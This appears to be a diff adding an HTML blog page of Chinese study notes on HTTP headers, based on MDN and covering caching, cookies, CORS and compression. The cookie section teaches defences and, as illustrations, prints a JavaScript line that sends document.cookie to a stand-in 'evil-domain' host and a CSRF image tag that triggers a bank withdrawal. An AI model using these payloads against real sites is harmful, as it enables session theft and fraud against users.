@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- 2019-02-18 一 15:32 -->
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTTP Headers 学习笔记</title>
+<meta name="generator" content="Org mode">
+<meta name="author" content="saltb0rn">
+<style type="text/css">
+ <!--/*--><![CDATA[/*><!--*/
+  .title  { text-align: center;
+             margin-bottom: .2em; }
+  .subtitle { text-align: center;
+              font-size: medium;
+              font-weight: bold;
+              margin-top:0; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { font-family: monospace; color: green; }
+  .priority { font-family: monospace; color: orange; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #ccc;
+    box-shadow: 3px 3px 3px #eee;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: visible;
+    padding-top: 1.2em;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    background-color: white;
+    top: -10px;
+    right: 10px;
+    padding: 3px;
+    border: 1px solid black;
+  }
+  pre.src:hover:before { display: inline;}
+  /* Languages per Org manual */
+  pre.src-asymptote:before { content: 'Asymptote'; }
+  pre.src-awk:before { content: 'Awk'; }
+  pre.src-C:before { content: 'C'; }
+  /* pre.src-C++ doesn't work in CSS */
+  pre.src-clojure:before { content: 'Clojure'; }
+  pre.src-css:before { content: 'CSS'; }
+  pre.src-D:before { content: 'D'; }
+  pre.src-ditaa:before { content: 'ditaa'; }
+  pre.src-dot:before { content: 'Graphviz'; }
+  pre.src-calc:before { content: 'Emacs Calc'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-fortran:before { content: 'Fortran'; }
+  pre.src-gnuplot:before { content: 'gnuplot'; }
+  pre.src-haskell:before { content: 'Haskell'; }
+  pre.src-hledger:before { content: 'hledger'; }
+  pre.src-java:before { content: 'Java'; }
+  pre.src-js:before { content: 'Javascript'; }
+  pre.src-latex:before { content: 'LaTeX'; }
+  pre.src-ledger:before { content: 'Ledger'; }
+  pre.src-lisp:before { content: 'Lisp'; }
+  pre.src-lilypond:before { content: 'Lilypond'; }
+  pre.src-lua:before { content: 'Lua'; }
+  pre.src-matlab:before { content: 'MATLAB'; }
+  pre.src-mscgen:before { content: 'Mscgen'; }
+  pre.src-ocaml:before { content: 'Objective Caml'; }
+  pre.src-octave:before { content: 'Octave'; }
+  pre.src-org:before { content: 'Org mode'; }
+  pre.src-oz:before { content: 'OZ'; }
+  pre.src-plantuml:before { content: 'Plantuml'; }
+  pre.src-processing:before { content: 'Processing.js'; }
+  pre.src-python:before { content: 'Python'; }
+  pre.src-R:before { content: 'R'; }
+  pre.src-ruby:before { content: 'Ruby'; }
+  pre.src-sass:before { content: 'Sass'; }
+  pre.src-scheme:before { content: 'Scheme'; }
+  pre.src-screen:before { content: 'Gnu Screen'; }
+  pre.src-sed:before { content: 'Sed'; }
+  pre.src-sh:before { content: 'shell'; }
+  pre.src-sql:before { content: 'SQL'; }
+  pre.src-sqlite:before { content: 'SQLite'; }
+  /* additional languages in org.el's org-babel-load-languages alist */
+  pre.src-forth:before { content: 'Forth'; }
+  pre.src-io:before { content: 'IO'; }
+  pre.src-J:before { content: 'J'; }
+  pre.src-makefile:before { content: 'Makefile'; }
+  pre.src-maxima:before { content: 'Maxima'; }
+  pre.src-perl:before { content: 'Perl'; }
+  pre.src-picolisp:before { content: 'Pico Lisp'; }
+  pre.src-scala:before { content: 'Scala'; }
+  pre.src-shell:before { content: 'Shell Script'; }
+  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
+  /* additional language identifiers per "defun org-babel-execute"
+       in ob-*.el */
+  pre.src-cpp:before  { content: 'C++'; }
+  pre.src-abc:before  { content: 'ABC'; }
+  pre.src-coq:before  { content: 'Coq'; }
+  pre.src-groovy:before  { content: 'Groovy'; }
+  /* additional language identifiers from org-babel-shell-names in
+     ob-shell.el: ob-shell is the only babel language using a lambda to put
+     the execution function name together. */
+  pre.src-bash:before  { content: 'bash'; }
+  pre.src-csh:before  { content: 'csh'; }
+  pre.src-ash:before  { content: 'ash'; }
+  pre.src-dash:before  { content: 'dash'; }
+  pre.src-ksh:before  { content: 'ksh'; }
+  pre.src-mksh:before  { content: 'mksh'; }
+  pre.src-posh:before  { content: 'posh'; }
+  /* Additional Emacs modes also supported by the LaTeX listings package */
+  pre.src-ada:before { content: 'Ada'; }
+  pre.src-asm:before { content: 'Assembler'; }
+  pre.src-caml:before { content: 'Caml'; }
+  pre.src-delphi:before { content: 'Delphi'; }
+  pre.src-html:before { content: 'HTML'; }
+  pre.src-idl:before { content: 'IDL'; }
+  pre.src-mercury:before { content: 'Mercury'; }
+  pre.src-metapost:before { content: 'MetaPost'; }
+  pre.src-modula-2:before { content: 'Modula-2'; }
+  pre.src-pascal:before { content: 'Pascal'; }
+  pre.src-ps:before { content: 'PostScript'; }
+  pre.src-prolog:before { content: 'Prolog'; }
+  pre.src-simula:before { content: 'Simula'; }
+  pre.src-tcl:before { content: 'tcl'; }
+  pre.src-tex:before { content: 'TeX'; }
+  pre.src-plain-tex:before { content: 'Plain TeX'; }
+  pre.src-verilog:before { content: 'Verilog'; }
+  pre.src-vhdl:before { content: 'VHDL'; }
+  pre.src-xml:before { content: 'XML'; }
+  pre.src-nxml:before { content: 'XML'; }
+  /* add a generic configuration mode; LaTeX export needs an additional
+     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
+  pre.src-conf:before { content: 'Configuration File'; }
+
+  table { border-collapse:collapse; }
+  caption.t-above { caption-side: top; }
+  caption.t-bottom { caption-side: bottom; }
+  td, th { vertical-align:top;  }
+  th.org-right  { text-align: center;  }
+  th.org-left   { text-align: center;   }
+  th.org-center { text-align: center; }
+  td.org-right  { text-align: right;  }
+  td.org-left   { text-align: left;   }
+  td.org-center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara { display: inline; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .equation-container {
+    display: table;
+    text-align: center;
+    width: 100%;
+  }
+  .equation {
+    vertical-align: middle;
+  }
+  .equation-label {
+    display: table-cell;
+    text-align: right;
+    vertical-align: middle;
+  }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  .org-svg { width: 90%; }
+  /*]]>*/-->
+</style>
+<link rel="stylesheet" type="text/css" href="../../../css/stylesheet.css"/>
+<link rel="icon" type="image/png" href="../../../img/icon.png" />
+<script type="text/javascript" src="../../../js/live.js" defer></script>
+<script src="../../../js/main.js" defer></script>
+<script type="text/javascript">
+/*
+@licstart  The following is the entire license notice for the
+JavaScript code in this tag.
+
+Copyright (C) 2012-2019 Free Software Foundation, Inc.
+
+The JavaScript code in this tag is free software: you can
+redistribute it and/or modify it under the terms of the GNU
+General Public License (GNU GPL) as published by the Free Software
+Foundation, either version 3 of the License, or (at your option)
+any later version.  The code is distributed WITHOUT ANY WARRANTY;
+without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.
+
+As additional permission under GNU GPL version 3 section 7, you
+may distribute non-source (e.g., minimized or compacted) forms of
+that code without the copy of the GNU GPL normally required by
+section 4, provided you include this license notice and a URL
+through which recipients can access the Corresponding Source.
+
+
+@licend  The above is the entire license notice
+for the JavaScript code in this tag.
+*/
+<!--/*--><![CDATA[/*><!--*/
+ function CodeHighlightOn(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(null != target) {
+     elem.cacheClassElem = elem.className;
+     elem.cacheClassTarget = target.className;
+     target.className = "code-highlighted";
+     elem.className   = "code-highlighted";
+   }
+ }
+ function CodeHighlightOff(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(elem.cacheClassElem)
+     elem.className = elem.cacheClassElem;
+   if(elem.cacheClassTarget)
+     target.className = elem.cacheClassTarget;
+ }
+/*]]>*///-->
+</script>
+</head>
+<body>
+<div id="org-div-home-and-up">
+    <nav>
+        <a href="/"><img src="../../../img/logo.png" alt="Logo is on the way"/></a>
+        <ul>
+            <li><a accesskey="H" href="/"> Home </a></li>
+            <li><a accesskey="T" href="/tags"> Tags </a></li>
+            <li><a accesskey="A" href="/about"> About </a></li>
+        </ul>
+    </nav>
+</div>
+<div id="content">
+<h1 class="title">HTTP Headers 学习笔记</h1>
+<div class="abstract">
+<p>
+大概两年前粗略地读过一下 <b>HTTP权威指南</b> 这本书(不知道名字有没有记错),当时读起来感觉好难懂,现在想起来感觉就像读 <code>Reference</code> 一样,不过书的确是好书,不过做为教程就有点过于厚重了.
+</p>
+
+<p>
+因为之前读 <b>HTTP权威指南</b> 的时候还有很多地方不太懂,所以最近打算要复习一下 <code>HTTP Headers</code> 的内容,正好发现 <b>MDN</b> 上面有这部分的教程,并且简单明了,于是打算针对这一块这个笔记.
+</p>
+
+<p>
+说个题外话, <b>MDN</b> 真是一个关于 <b>WEB</b> 开发的很好的文档库,我说的 <b>WEB</b> 开发并非只针对前端或者后端,而是前后端的总和, <b>MDN</b> 的教程相比那些厚重的书可谓是好太多了,简单易懂,而且还免费,这里衷心感谢 <b>Mozilla</b> 以及开源社区的各位.
+</p>
+
+<p>
+题外话二,最近怠惰了好多,这篇文章其实很早之前就开始写了,不过懒癌晚期导致最近才发出来,新的一年要做出一些改变, time to show your true Tenno power.
+</p>
+
+</div>
+
+<p>
+HTTP 的<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview">概览</a>就不写了,自己看就好.后面也一样,详细的东西不会再赘述,我只会大概总结比较重要的东西.这里的内容我尽量会用 <code>Nginx</code> 的 <code>add_header</code> 指令来实践一下.
+</p>
+
+<div id="outline-container-org5cc2296" class="outline-2">
+<h2 id="org5cc2296">缓存 (Cache)</h2>
+<div class="outline-text-2" id="text-org5cc2296">
+<p>
+缓存有不同类型(这里的缓存是指 <code>WEB</code> 的组成部分,并非储存的内容,自己结合上下文了解),可以分两大类: 私有(private)和公有(shared).私有就是只针对单个用户,比如浏览器自带的缓存;公有是对于多个用户的,公有缓存的目是储存可以复用的响应资源,比如代理缓存,网关缓存, <code>CDN</code>, 以及 <code>WEB</code> 服务器部署的反向代理缓存和负载均衡.
+</p>
+
+<p>
+并非所有东西都够被缓存(cached),通常限于 <code>GET</code> 响应,其它请求方法可能没有那么好,常见的可缓存对象有如下:
+</p>
+
+<ol class="org-ol">
+<li>成功响应 (<code>GET</code> 请求的 <code>200</code> 响应)</li>
+
+<li>永久重定向 (<code>301</code> 响应)</li>
+
+<li>错误响应 (<code>404</code> 页面)</li>
+
+<li>不完全响应 (<code>206</code> 响应)</li>
+
+<li>除了 <code>GET</code> 以外适合用于作为缓存键(cache key)的响应,比如由不同键(secondary key)区分的多个缓存响应的组合</li>
+</ol>
+
+<p>
+缓存索引内容形式大概就是 <code>Key : Value</code>, <code>Value</code> 就是缓存的内容, <code>Key</code> 是 <code>请求方法 + 目标 URI</code> 这样的组合,当用同样的请求方法请求同样的 <code>URI</code> 的时候就会找到对应的缓存资源了.
+</p>
+</div>
+
+<div id="outline-container-org3d3870f" class="outline-3">
+<h3 id="org3d3870f">缓存控制</h3>
+<div class="outline-text-3" id="text-org3d3870f">
+</div>
+<div id="outline-container-orgbc108b8" class="outline-4">
+<h4 id="orgbc108b8">Cache-Control</h4>
+<div class="outline-text-4" id="text-orgbc108b8">
+<p>
+<code>HTTP/1.1</code> 的通用头,用来指定对于请求和响应的储存机制.
+</p>
+
+<ul class="org-ul">
+<li><p>
+完全不缓存任何内容,每次浏览器请求服务器的时候都会得到一个完整的请求
+</p>
+
+<pre class="example">
+Cache-Control: no-store
+
+或者
+
+Cache-Control: no-cache, no-store, must-revalidate
+</pre></li>
+
+<li><p>
+不让缓存服务器缓存资源,在服务器发放新的缓存副本之前,缓存服务器会给原本的服务器发送请求进行验证,
+</p>
+
+<p>
+因为浏览器和服务器(也就是前面的原本的服务器)之间可能会有各种缓存(服务器),原本服务器更新了内容的话,中间缓存不一定会及时得到更新,为了确保是和原本服务器的内容一样就需要这么做了.
+</p>
+
+<pre class="example">
+Cache-Control: no-cache
+</pre></li>
+
+<li><p>
+设置公有或者私有缓存
+</p>
+
+<pre class="example">
+Cache-Control: private
+
+或者
+
+Cache-Control: public
+</pre></li>
+
+<li><p>
+设置缓存内容的生命周期为 <code>&lt;seconds&gt;</code> 秒
+</p>
+
+<pre class="example">
+Cache-Control: max-age=&lt;seconds&gt;
+</pre></li>
+
+<li><p>
+使用前必须验证缓存内容
+</p>
+
+<pre class="example">
+Cache-Control: must-revalidate
+</pre></li>
+</ul>
+</div>
+</div>
+</div>
+
+
+<div id="outline-container-orgf0b29fb" class="outline-3">
+<h3 id="orgf0b29fb">新鲜度 (Freshness)</h3>
+<div class="outline-text-3" id="text-orgf0b29fb">
+<p>
+新鲜度话题涉及浏览器,缓存(服务器)以及源服务器三个组成部分.
+</p>
+
+
+<div class="figure">
+<p><img src="https://mdn.mozillademos.org/files/13771/HTTPStaleness.png" alt="HTTPStaleness.png">
+</p>
+<p><span class="figure-number">Figure 1: </span>公有缓存的处理过程</p>
+</div>
+
+<p>
+新鲜度时间根据几个头来计算的,不同情况的计算方式不一样,
+</p>
+
+<ol class="org-ol">
+<li>如果指定了 <code>Cache-control: max-age=N</code>,那么新鲜度时间为 <code>N</code> 秒</li>
+
+<li>如果没有指定 <code>Cache-control: max-age=N</code>,那么检查 <code>Expires</code> 头,如果 <code>Expires</code> 头储存,那么它的值就减去 <code>Date</code> 头的值来得出新鲜度的时间.</li>
+
+<li>如果 <code>Expires</code> 头也不存在,那么就检查 <code>Last-Modification</code> 头,如果这个头存在,那么新鲜度的时间为 <code>Date</code> 头的值减去 <code>Last-Modified</code> 头的值的十分之一.</li>
+</ol>
+
+<p>
+计算出新鲜度后就可以计算过期时间了: <code>接受到响应的时间点 + 新鲜度时间 - 当前缓存服务器资源的年龄</code>
+</p>
+</div>
+</div>
+
+
+<div id="outline-container-orga568192" class="outline-3">
+<h3 id="orga568192">资源版本修订</h3>
+<div class="outline-text-3" id="text-orga568192">
+<p>
+给静态资源,比如 <code>CSS</code>, <code>JS</code> 这种文件的名字后面增加版本号,每次更新文件就修改版本号,这样可以(通过访问新的URI的方式)让静态资源马上得到更新.只需要开发人员开发的时候注意版本号,一般这工作都是交给自动构建工具完成的.
+</p>
+</div>
+</div>
+
+
+<div id="outline-container-org3d2a6ec" class="outline-3">
+<h3 id="org3d2a6ec">缓存验证</h3>
+<div class="outline-text-3" id="text-org3d2a6ec">
+<p>
+(注意缓存资源处于缓存中).
+</p>
+
+<p>
+如果缓存的响应包含 <code>Cache-control: must-revalidate</code> 头,那么当浏览器重新访问该资源的时候就会对它进行验证(发送验证请求),检查是否过期.
+</p>
+
+<p>
+当缓存的文档到了过期时间,那么就会验证它或者刷新它,只有服务器提供了强验证器(strong validator)或者弱验证器(weak validator)的时候浏览器才会发验证请求.
+</p>
+
+<p>
+强验证器是指响应头对于 <code>user agent</code> 不透明的,也就是说 <code>user agent</code> 不知道这个头的值代表什么以及值是什么.弱验证器是因为它们的精确度准确到秒.
+</p>
+
+<p>
+强验证器有 <code>ETag</code>,弱验证器有 <code>Last-Modified</code>.
+</p>
+
+<p>
+如果资源的部分响应中含有 <code>ETag</code> 头,那么客户端可以在后续的请求中加入 <code>If-None-Match</code> 头来验证缓存的资源.
+</p>
+
+<p>
+如果响应中有 <code>Last-Modified</code> 头,那么客户端可以在后续的请求头中加入 <code>If-Modified-Since</code> 头来验证缓存的文档.
+</p>
+
+<p>
+当验证的请求发送后,服务器可以通过返回 <code>200 OK</code> 来无视验证请求,或者返回 <code>304 Not Modified</code> 来告诉浏览器可以继续使用缓存的备份.后者还可以更新缓存文档的过期时间.
+</p>
+</div>
+</div>
+
+
+<div id="outline-container-orgae26abf" class="outline-3">
+<h3 id="orgae26abf">区分响应 (Varying response)</h3>
+<div class="outline-text-3" id="text-orgae26abf">
+<p>
+<code>Vary</code> <code>HTTP</code> 响应头判断如何匹配之后的请求来决定是否继续使用一个已缓存的响应而或者向服务器请求刷新.
+</p>
+
+<p>
+当缓存服务器收到一个请求,如果该请求带有一个 <code>Vary</code> 头,并且该 <code>Vary</code> 头与已缓存的响应的 <code>Vary</code> 一致就可以继续使用已缓存的资源,否则刷新资源.
+</p>
+
+
+<div class="figure">
+<p><img src="https://mdn.mozillademos.org/files/13769/HTTPVary.png" alt="HTTPVary.png">
+</p>
+<p><span class="figure-number">Figure 2: </span>HTTP Vary 头</p>
+</div>
+</div>
+</div>
+</div>
+
+
+<div id="outline-container-orged4d564" class="outline-2">
+<h2 id="orged4d564">Cookies</h2>
+<div class="outline-text-2" id="text-orged4d564">
+<p>
+<code>Cookies</code> 的具体作用就不多说了,具体参考<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">这里</a>开头介绍.
+</p>
+
+<p>
+服务器通过 <code>Set-Cookie</code> 响应头给 <code>User Agent</code> 颁发 <code>cookies</code>, <code>User Agent</code> 通过 <code>Cookie</code> 请求头给服务器发送 <code>cookies</code> 用来验证.
+</p>
+</div>
+
+<div id="outline-container-org8ea8d87" class="outline-3">
+<h3 id="org8ea8d87">会话cookies (Session Cookies)</h3>
+<div class="outline-text-3" id="text-org8ea8d87">
+<p>
+结果例子,服务器给客户端颁发了一个 <code>cookie</code>,
+</p>
+
+<p>
+响应头如下:
+</p>
+
+<pre class="example">
+HTTP/2.0 200 OK
+Content-type: text/html
+Set-Cookie: yummy_cookie=choco
+Set-Cookie: tasty_cookie=strawberry
+
+[page content]
+</pre>
+
+<p>
+客户端再次请求服务器时候的请求头如下:
+</p>
+
+<pre class="example">
+GET /sample_page.html HTTP/2.0
+Host: www.example.org
+Cookie: yummy_cookie=choco; tasty_cookie=strawberry
+</pre>
+
+<p>
+这种叫做会话 <code>cookies</code>,这种 <code>cookies</code> 不指定 <code>Expires</code> 或者 <code>Max-Age</code> 头,一旦客户端关闭就会删除这些 <code>cookies</code>.
+</p>
+
+<p>
+然而浏览器可以使用会话恢复(session restoring)功能,让大部份的会话 <code>cookies</code> 就好像没关闭过浏览器一样长期存在.
+</p>
+</div>
+</div>
+
+
+
+<div id="outline-container-org4c2367b" class="outline-3">
+<h3 id="org4c2367b">持久cookies (Permanent cookies)</h3>
+<div class="outline-text-3" id="text-org4c2367b">
+<p>
+与会话 <code>cookies</code> 相反,持久 <code>cookies</code> 会在(通过 <code>Expires</code> 指令设置)特定日期或者(通过 <code>Max-Age</code> 指令设置)特定时间后过期.
+</p>
+
+<pre class="example">
+Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
+</pre>
+</div>
+</div>
+
+
+
+
+
+
+
+
+
+<div id="outline-container-org8a0152f" class="outline-3">
+<h3 id="org8a0152f">Secure和HttpOnly</h3>
+<div class="outline-text-3" id="text-org8a0152f">
+<p>
+当 <code>cookies</code> 标记为 <code>Secure</code> 后,该 <code>cookie</code> 只能经过 <code>HTTPS</code> 协议加密后发送给服务器,即便如此也不要把重要信息储存在 <code>cookies</code> 中.
+</p>
+
+<p>
+为了防止跨站脚本(cross-site scripting OR XSS)攻击, <code>JavaScript</code> 的 <code>document.cookie API</code> 是不能访问设置了 <code>HttpOnly</code> 的 <code>cookies</code> 的.
+</p>
+
+<pre class="example">
+Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
+</pre>
+</div>
+</div>
+
+
+<div id="outline-container-org859d0b5" class="outline-3">
+<h3 id="org859d0b5">Cookies的作用域</h3>
+<div class="outline-text-3" id="text-org859d0b5">
+<p>
+<code>Cookies</code> 通过 <code>Domain</code> 和 <code>Path</code> 两个指令指定 <code>cookies</code> 的作用域,也就是告诉客户端 <code>cookies</code> 要发送到哪里.
+</p>
+
+<p>
+<code>Domain</code> 指定可以接收 <code>cookies</code> 的服务器,如果没有指定,默认就是当前文档位置的服务器 (host of the current document location),不算它的子域;如果指定了,那么子域就包含进去.
+</p>
+
+<p>
+<code>Path</code> 指定可以发送到 <code>Domain</code> 下的特定路径,该路径必须要存在在请求的 <code>URL</code> 中.
+</p>
+
+<p>
+比如,如果 <code>Path=/docs</code>,那么以下路径也会被匹配:
+</p>
+
+<pre class="example">
+/doc
+/doc/Web/
+/docs/Web/HTTP
+</pre>
+</div>
+</div>
+
+
+
+<div id="outline-container-org2f54068" class="outline-3">
+<h3 id="org2f54068">会话劫持和XSS(Session hijacking and XSS)以及跨站请求伪造(Cross-site request forgery)</h3>
+<div class="outline-text-3" id="text-org2f54068">
+<p>
+会话劫持就是通过社会工程学或者利用 <code>WEB</code> 的 <code>XSS</code> 漏洞来窃取 <code>cookie</code>,比如一个用户登录了一个网站,这个时候用户在这个页面点击了一个伪造的连接如:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-javascript">(<span style="color: #F0DFAF; font-weight: bold;">new</span> <span style="color: #7CB8BB;">Image</span>()).src = <span style="color: #CC9393;">"http://www.evil-domain.com/steal-cookie?cookie="</span> + document.cookie;
+</pre>
+</div>
+
+<p>
+<code>HttpOnly</code> 可以防止这种问题的发生.
+</p>
+
+<p>
+跨站请求伪造和 <code>XSS</code> 其实差不多,不过比起 <code>XSS</code> 直接偷 <code>cookie</code>,它是直接利用用户登录后的 <code>cookie</code> 直接调用一些接口,比如万年的银行转账例子:
+</p>
+
+<p>
+用户登录了银行帐号并且 <code>cookie</code> 还合法,然后点击了这个连接:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-html">&lt;<span style="color: #93E0E3;">img</span> <span style="color: #DFAF8F;">src</span>=<span style="color: #CC9393;">"http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory"</span>&gt;
+</pre>
+</div>
+</div>
+</div>
+
+
+
+<div id="outline-container-org0ca1560" class="outline-3">
+<h3 id="org0ca1560">跟踪和隐私</h3>
+<div class="outline-text-3" id="text-org0ca1560">
+</div>
+<div id="outline-container-orgc4fc1ee" class="outline-4">
+<h4 id="orgc4fc1ee">第三方 cookies (Third-party cookies)</h4>
+<div class="outline-text-4" id="text-orgc4fc1ee">
+<p>
+<code>Cookie</code> 是和域名关联的,如果 <code>cookie</code> 关联的域名和当前域名的域名一样,这种 <code>cookie</code> 就是第一方 <code>cookie</code> (first-party cookies),第一方 <code>cookie</code> 只会被发送到源服务器中.
+</p>
+
+<p>
+和第一方 <code>cookie</code> 相对,如果发送的服务器的域和 <code>cookie</code> 关联的域名不一样,那么这些 <code>cookies</code> 叫做第三方 <code>cookie</code> (third-party cookies).第三方 <code>cookie</code> 最常见的就是网页的广告,有第三方拓展可以禁止第三方 <code>cookie</code>.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgf4811a2" class="outline-4">
+<h4 id="orgf4811a2">Do-Not-Track</h4>
+<div class="outline-text-4" id="text-orgf4811a2">
+<p>
+<code>DNT</code> 头告诉 <code>Web</code> 应用或者跨站用户不要跟踪某个用户.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org9c55215" class="outline-4">
+<h4 id="org9c55215">僵尸cookies和删不掉的cookies (Zombie cookies and Evercookies)</h4>
+<div class="outline-text-4" id="text-org9c55215">
+<p>
+在删除之后马上被重新新建的 <code>cookies</code> 叫做僵尸 <code>cookies</code> 或者叫做删不掉的 <code>cookies</code>,这是通过 <code>Web storage API</code>, <code>Flash</code> 本地共享对象 (<code>Flash Local Shared Objects</code>) 以及其他技术来实现.
+</p>
+</div>
+</div>
+</div>
+</div>
+
+
+<div id="outline-container-org877b366" class="outline-2">
+<h2 id="org877b366">跨域资源共享 (CORS: Cross-Origin Resource Sharing)</h2>
+<div class="outline-text-2" id="text-org877b366">
+<p>
+<code>CORS</code> 是一套机制: 通过使用额外的 <code>HTTP</code> 头告诉浏览器在某个域上运行的 <code>WEB</code> 应用拥有访问其它源上的某些(全部或者部分)资源.浏览器发送的这种请求叫做跨源请求(cross-origin HTTP request),只要域,协议和端口这三者中有一个不一样,那么就是不同源.
+</p>
+
+<p>
+出于安全原因,浏览器会限制脚本的跨源请求,比如 <code>XMLHttpRequest</code> 和 <code>Fetch API</code> 就是遵守同源策略(same-origin policy),也就是说这些 <code>APIs</code> 只能请求同一个源上的资源,除非其它源(服务器)的响应配置了正确的 <code>CORS</code> 头部.
+</p>
+
+<p>
+并非所有请求(request method)都会触发 <code>CORS preflighted (CORS 预测)</code>,(相对于简单请求)预测请求就是首先发送一个 <code>OPTIONS</code> 方法的请求,目的是为了知道资源的服务器支持哪些请求方法,然后再处理后续请求.不触发预测请求的请求叫做简单请求(simple requests).简单请求需要满足这些<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Simple_requests">条件</a>,预测请求则需要满足这些<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Preflighted_requests">条件</a>.
+</p>
+
+
+<div class="figure">
+<p><img src="https://mdn.mozillademos.org/files/14293/simple_req.png" alt="simple_req.png">
+</p>
+<p><span class="figure-number">Figure 3: </span>简单请求</p>
+</div>
+
+
+<div class="figure">
+<p><img src="https://mdn.mozillademos.org/files/16401/preflight_.png" alt="preflight_.png">
+</p>
+<p><span class="figure-number">Figure 4: </span>预测请求</p>
+</div>
+
+<p>
+其中:
+</p>
+
+<ol class="org-ol">
+<li>请求中的 <code>Origin</code> 头表示发起请求的源;</li>
+
+<li>响应中的 <code>Access-Control-Allow-Origin</code> 头表示允许发请求访问的源;</li>
+
+<li>在预测请求中, <code>Access-Control-Request-Method</code> 头通知资源服务器接下来要发送实际请求的方法;</li>
+
+<li>在预测请求中, <code>Access-Control-Request-Headers</code> 头通知资源服务器发送实际请求时候带的自定义头;</li>
+
+<li>在预测响应中, <code>Access-Control-Allow-Methods</code> 头通知浏览器能发送的请求方法;</li>
+
+<li>在预测响应中, <code>Access-Control-Allow-Headers</code> 头通知浏览器能发送的自定义头;</li>
+
+<li>在预测响应中, <code>Access-Control-Max-Age</code> 指定了响应在下一个预测请求发送前能够缓存的时间.</li>
+</ol>
+</div>
+
+<div id="outline-container-org8edb2a9" class="outline-3">
+<h3 id="org8edb2a9">跨源请求的凭证问题</h3>
+<div class="outline-text-3" id="text-org8edb2a9">
+<p>
+默认情况下,跨域 <code>XMLHttpRequest</code> 或者 <code>Fetch</code> 进行请求是不会发送凭证(<code>HTTP cookies</code> 和 <code>验证信息</code>)的.
+</p>
+
+<p>
+如果想要利用这些 <code>APIs</code> 进行带凭证的跨域请求,可以设置 <code>XMLHttpRequest</code> 对象的 <code>withCredentials</code> <code>flag</code> 或者构建 <code>Request</code> 对象时候设置 <code>credentials</code> 参数.
+</p>
+
+<p>
+如果服务器没有针对这些请求在响应中添加 <code>Access-Control-Allow-Credentials: true</code> 头,那么这个响应就会被浏览器无视.
+</p>
+
+<p>
+还有要注意的是,当服务器接受到带凭证的跨域请求的时候, <code>Access-Control-Allow-Origin</code> 头一定要指定特定的源,不能是 <code>*</code> 元字符,否则会失败,因为带凭证的跨域请求带有 <code>Cookie</code> 头,而 <code>*</code> 不能正确匹配.
+</p>
+
+<p>
+在 <code>CORS</code> 响应中设置的 <code>cookies</code> 叫做第三方 <code>cookie</code> (相关的参考 third-party cookie policies),如果用户把浏览器配置成不拒绝第三方 <code>cookies</code> 的话,第三方 <code>cookies</code> 就不会被保存.
+</p>
+</div>
+</div>
+</div>
+
+
+<div id="outline-container-orgc828cc8" class="outline-2">
+<h2 id="orgc828cc8">压缩 (Compression)</h2>
+<div class="outline-text-2" id="text-orgc828cc8">
+<p>
+压缩可以提高网站的性能,节约带宽.现实中,开发开发者不需要实现压缩,浏览器和服务器早就好了,不过开发者要保证服务器配置正确.
+</p>
+
+<p>
+可以在三个层面上进行压缩:
+</p>
+
+<ol class="org-ol">
+<li>文件格式</li>
+</ol>
+
+<p>
+文件相比文字占用的空间要大,如果文字的冗余程度多于 <code>60%</code>,那么换成文件的话就要占用更多的空间.文件压缩算法分两大类:无损压缩算法以及有损压缩算法.
+</p>
+
+<p>
+无损压缩算法(<code>Loss-less compression</code>)在解压和压缩过程中不修改要恢复的数据,复原前后的数据内容是一致的,比如 <code>gif</code> 和 <code>png</code> 格式的文件是采用无损压缩算法.
+</p>
+
+<p>
+有损压缩算法(<code>Lossy compression</code>)则在解压和压缩过程中对原始数据进行修改,修改的程度则是用户难以察觉,通常在线视频就是采用有损压缩算法, <code>jpeg</code> 格式的图片也是有损.
+</p>
+
+<p>
+也有一些文件格式可以采用两种算法,比如 <code>webp</code>,总体而言,有损压缩算法比无损压缩算法效率高.
+</p>
+
+<ol class="org-ol">
+<li><code>HTTP</code> 层面上的加密算法</li>
+</ol>
+
+<p>
